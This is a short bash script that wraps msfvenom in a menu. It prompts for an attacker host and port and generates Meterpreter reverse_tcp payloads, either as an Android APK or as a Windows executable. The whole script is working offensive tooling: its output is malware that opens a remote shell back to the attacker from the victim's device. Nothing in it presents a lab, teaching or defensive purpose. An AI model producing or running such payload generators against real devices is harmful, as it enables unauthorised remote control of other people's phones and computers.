#! /bin/bash

echo "1 = msf payload for android"
echo "2 = msf payload for windows"
echo "3 = exit"


fu1() {
read -p "Enter LHOST : " host
read -p "Enter LPORT : " port
read -p "Enter a Name for apk : " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $name.apk
./msf.sh 
}

fu2() {
read -p "Enter LHOST : " host
read -p "Enter LPORT : " port
read -p "Enter FileFormat : " format
read -p "Enter a Name for payload : " name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f $format -o $name.exe
./msf.sh 
}

fu3() { exit; }

read -p "Enter a Number : " num

if [[ $num = [123] ]]; then # validate input
  fu"$num"
fi